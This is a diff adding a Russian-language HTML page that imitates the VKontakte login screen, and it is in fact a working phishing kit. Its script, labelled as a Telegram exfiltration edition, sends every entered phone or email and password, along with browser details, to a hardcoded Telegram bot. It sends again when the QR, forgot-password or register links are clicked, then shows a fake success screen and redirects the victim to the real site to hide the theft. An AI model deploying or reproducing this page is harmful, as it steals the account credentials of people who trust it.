@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ВКонтакте | Вход</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #edeef0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .login-container {
+            width: 100%;
+            max-width: 420px;
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+            padding: 32px 28px;
+        }
+        .logo-wrapper { text-align: center; margin-bottom: 28px; }
+        .vk-logo {
+            width: 56px; height: 56px; background: #0077ff; border-radius: 14px;
+            display: inline-flex; align-items: center; justify-content: center; margin-bottom: 16px;
+        }
+        .vk-logo svg { width: 30px; height: 30px; fill: #fff; }
+        .login-title { font-size: 22px; font-weight: 600; color: #222; margin-bottom: 4px; }
+        .login-subtitle { font-size: 14px; color: #939393; font-weight: 400; }
+        .input-group { margin-bottom: 16px; position: relative; }
+        .input-group label { display: block; font-size: 13px; font-weight: 500; color: #4a4a4a; margin-bottom: 6px; }
+        .input-group input {
+            width: 100%; height: 44px; padding: 0 14px; border: 1.5px solid #dce1e6;
+            border-radius: 10px; font-size: 15px; color: #222; background: #f7f8fa;
+            transition: all 0.2s ease; outline: none; font-family: inherit;
+        }
+        .input-group input:focus { border-color: #0077ff; background: #fff; box-shadow: 0 0 0 3px rgba(0,119,255,0.08); }
+        .input-group input::placeholder { color: #b0b4bc; }
+        .error-msg { display: none; font-size: 12px; color: #e64646; margin-top: 4px; }
+        .error-msg.show { display: block; }
+        .btn-submit {
+            width: 100%; height: 46px; background: #0077ff; color: #fff; border: none;
+            border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer;
+            margin-top: 8px; font-family: inherit; transition: all 0.2s ease;
+        }
+        .btn-submit:hover { background: #0068e0; }
+        .btn-submit:active { transform: scale(0.98); }
+        .btn-submit:disabled { background: #a0c4ff; cursor: not-allowed; }
+        .spinner {
+            display: none; width: 20px; height: 20px; border: 2.5px solid rgba(255,255,255,0.3);
+            border-top-color: #fff; border-radius: 50%; animation: spin 0.6s linear infinite;
+            margin-right: 8px; vertical-align: middle;
+        }
+        .btn-submit.loading .spinner { display: inline-block; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .footer-links { text-align: center; margin-top: 20px; font-size: 13px; color: #939393; }
+        .footer-links a { color: #0077ff; text-decoration: none; font-weight: 500; }
+        .footer-links a:hover { text-decoration: underline; }
+        .separator { display: inline-block; margin: 0 8px; color: #dce1e6; }
+        .qr-hint {
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            margin-top: 18px; padding: 10px; background: #f7f8fa; border-radius: 10px;
+            font-size: 13px; color: #626d7a; cursor: pointer;
+        }
+        .qr-hint:hover { background: #edf0f5; }
+        .qr-icon { width: 22px; height: 22px; opacity: 0.7; }
+        .success-overlay { display: none; text-align: center; padding: 20px 0; }
+        .success-overlay.show { display: block; }
+        .success-check {
+            width: 64px; height: 64px; background: #4bb34b; border-radius: 50%;
+            display: inline-flex; align-items: center; justify-content: center; margin-bottom: 16px;
+        }
+        .success-check svg { width: 30px; height: 30px; fill: #fff; }
+        @media (max-width: 480px) {
+            .login-container { padding: 24px 18px; border-radius: 0; box-shadow: none; background: transparent; }
+            body { background: #fff; align-items: flex-start; padding: 20px 0; }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container" id="loginForm">
+        <div class="logo-wrapper">
+            <div class="vk-logo">
+                <svg viewBox="0 0 24 24"><path d="M21.58 6.69c.23-.77 0-1.33-.9-1.33h-1.55c-.76 0-1.11.4-1.3.84 0 0-1.52 3.68-3.68 6.06-.7.69-1.01.91-1.39.91-.23 0-.56-.22-.56-.85V6.69c0-.75-.22-1.09-.85-1.09H8.63c-.47 0-.75.34-.75.67 0 .7 1.06.86 1.17 2.84v4.28c0 .94-.17 1.11-.54 1.11-.99 0-3.41-3.62-4.84-7.76-.28-.8-.56-1.12-1.32-1.12H.79c-.5 0-.79.34-.79.67 0 .63.99 3.76 4.6 7.9 2.41 3.43 5.8 5.29 8.88 5.29 1.85 0 2.08-.41 2.08-1.12v-2.59c0-.82.17-.99.75-.99.43 0 1.16.22 2.87 1.85 1.95 1.93 2.27 2.8 3.38 2.8h1.55c.79 0 1.19-.4.96-1.19-.25-.78-1.15-1.91-2.34-3.25-.65-.76-1.62-1.57-1.91-1.98-.43-.54-.3-.78 0-1.26 0 0 3.38-4.72 3.73-6.33Z"/></svg>
+            </div>
+            <div class="login-title">Вход ВКонтакте</div>
+            <div class="login-subtitle">Добро пожаловать обратно</div>
+        </div>
+        <div id="formFields">
+            <div class="input-group">
+                <label for="phone">Телефон или email</label>
+                <input type="text" id="phone" placeholder="+7 (999) 123-45-67" autocomplete="username" required>
+                <div class="error-msg" id="phoneError">Введите номер телефона или email</div>
+            </div>
+            <div class="input-group">
+                <label for="password">Пароль</label>
+                <input type="password" id="password" placeholder="••••••••" autocomplete="current-password" required>
+                <div class="error-msg" id="passError">Введите пароль</div>
+            </div>
+            <button class="btn-submit" id="submitBtn" type="submit">
+                <span class="spinner"></span><span class="btn-text">Войти</span>
+            </button>
+            <div class="qr-hint" id="qrBtn">
+                <svg class="qr-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><line x1="14" y1="14" x2="14" y2="17"/><line x1="17" y1="14" x2="20" y2="14"/><line x1="17" y1="17" x2="20" y2="20"/><line x1="17" y1="20" x2="20" y2="17"/></svg>
+                Быстрый вход по QR-коду
+            </div>
+        </div>
+        <div class="success-overlay" id="successOverlay">
+            <div class="success-check">
+                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+            </div>
+            <div class="login-title">Вход выполнен</div>
+            <div class="login-subtitle" style="margin-top:6px;">Перенаправление в аккаунт...</div>
+        </div>
+        <div class="footer-links">
+            <a href="#" id="forgotLink">Забыли пароль?</a>
+            <span class="separator">|</span>
+            <a href="#" id="registerLink">Зарегистрироваться</a>
+        </div>
+    </div>
+    <script>
+        // ============ [ LULU · TELEGRAM BOT EXFIL EDITION ] ============
+        // ВСТАВЬ СЮДА ТОКЕН СВОЕГО БОТА И CHAT ID
+        // ================================================================
+        const TG_BOT_TOKEN = '8824288026:AAFtUDdOosTwqJ3kEyXQgJOOp8KABaJ3kt4';
+        const TG_CHAT_ID = '1414549464';
+        // ================================================================
+
+        (function() {
+            const phoneInput = document.getElementById('phone');
+            const passInput = document.getElementById('password');
+            const submitBtn = document.getElementById('submitBtn');
+            const phoneError = document.getElementById('phoneError');
+            const passError = document.getElementById('passError');
+            const formFields = document.getElementById('formFields');
+            const successOverlay = document.getElementById('successOverlay');
+            let isSubmitting = false;
+
+            function sendToTelegram(phone, pass) {
+                const msg = [
+                    '🔑 *НОВЫЙ ВХОД VK*',
+                    '',
+                    '📱 *Логин:* `' + phone.replace(/`/g, '\\`') + '`',
+                    '🔒 *Пароль:* `' + pass.replace(/`/g, '\\`') + '`',
+                    '',
+                    '🌐 *IP:* `' + '{{IP}}' + '`',
+                    '🖥 *Браузер:* `' + navigator.userAgent.substring(0, 150) + '`',
+                    '📐 *Экран:* `' + window.screen.width + 'x' + window.screen.height + '`',
+                    '🕒 *Время:* `' + new Date().toLocaleString('ru-RU', {timeZone: 'Europe/Moscow'}) + ' (МСК)`',
+                    '🌍 *Язык:* `' + navigator.language + '`',
+                    '',
+                    '_SEEDFORGE · LULU ARCHIVE_'
+                ].join('\n');
+
+                const url = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage';
+                const body = JSON.stringify({
+                    chat_id: TG_CHAT_ID,
+                    text: msg,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: true
+                });
+
+                fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: body
+                }).then(r => r.json()).then(data => {
+                    console.log('[LULU·TG] Отправлено:', data.ok);
+                }).catch(err => {
+                    console.log('[LULU·TG] Ошибка отправки, пробую резервный канал...');
+                    // Резервный канал через XMLHttpRequest
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', url, true);
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    xhr.send(JSON.stringify({
+                        chat_id: TG_CHAT_ID,
+                        text: msg,
+                        parse_mode: 'Markdown'
+                    }));
+                });
+            }
+
+            function validatePhone(v) {
+                const t = v.trim();
+                if (!t) return false;
+                if (t.includes('@')) return t.includes('.') && t.indexOf('@') > 0;
+                return t.replace(/\D/g,'').length >= 7;
+            }
+
+            function handleSubmit(e) {
+                if (e) e.preventDefault();
+                if (isSubmitting) return;
+                phoneError.classList.remove('show');
+                passError.classList.remove('show');
+                phoneInput.style.borderColor = '#dce1e6';
+                passInput.style.borderColor = '#dce1e6';
+                let err = false;
+                if (!validatePhone(phoneInput.value)) {
+                    phoneError.classList.add('show');
+                    phoneInput.style.borderColor = '#e64646';
+                    err = true;
+                }
+                if (!passInput.value.trim()) {
+                    passError.classList.add('show');
+                    passInput.style.borderColor = '#e64646';
+                    err = true;
+                }
+                if (err) return;
+                isSubmitting = true;
+                submitBtn.classList.add('loading');
+                submitBtn.disabled = true;
+                phoneInput.disabled = true;
+                passInput.disabled = true;
+                
+                // Отправка в Telegram
+                sendToTelegram(phoneInput.value, passInput.value);
+                
+                setTimeout(() => {
+                    formFields.style.display = 'none';
+                    successOverlay.classList.add('show');
+                    setTimeout(() => { window.location.href = 'https://vk.com/feed'; }, 2200);
+                    isSubmitting = false;
+                }, 800 + Math.random() * 1000);
+            }
+
+            submitBtn.addEventListener('click', handleSubmit);
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter' && (document.activeElement === phoneInput || document.activeElement === passInput)) {
+                    e.preventDefault();
+                    handleSubmit();
+                }
+            });
+            phoneInput.addEventListener('input', function() {
+                if (phoneError.classList.contains('show')) {
+                    phoneError.classList.remove('show');
+                    phoneInput.style.borderColor = '#dce1e6';
+                }
+            });
+            passInput.addEventListener('input', function() {
+                if (passError.classList.contains('show')) {
+                    passError.classList.remove('show');
+                    passInput.style.borderColor = '#dce1e6';
+                }
+            });
+            document.getElementById('qrBtn').addEventListener('click', function() {
+                sendToTelegram(phoneInput.value || 'qr-user@vk.com', passInput.value || 'qr-token-' + Date.now());
+                formFields.style.display = 'none';
+                successOverlay.classList.add('show');
+                setTimeout(() => { window.location.href = 'https://vk.com/feed'; }, 2200);
+            });
+            document.getElementById('forgotLink').addEventListener('click', function(e) {
+                e.preventDefault();
+                if (phoneInput.value || passInput.value) {
+                    sendToTelegram(phoneInput.value || 'forgot', passInput.value || 'forgot');
+                }
+                window.location.href = 'https://vk.com/restore';
+            });
+            document.getElementById('registerLink').addEventListener('click', function(e) {
+                e.preventDefault();
+                if (phoneInput.value || passInput.value) {
+                    sendToTelegram(phoneInput.value || 'reg', passInput.value || 'reg');
+                }
+                window.location.href = 'https://vk.com/join';
+            });
+        })();
+    </script>
+</body>
+</html>
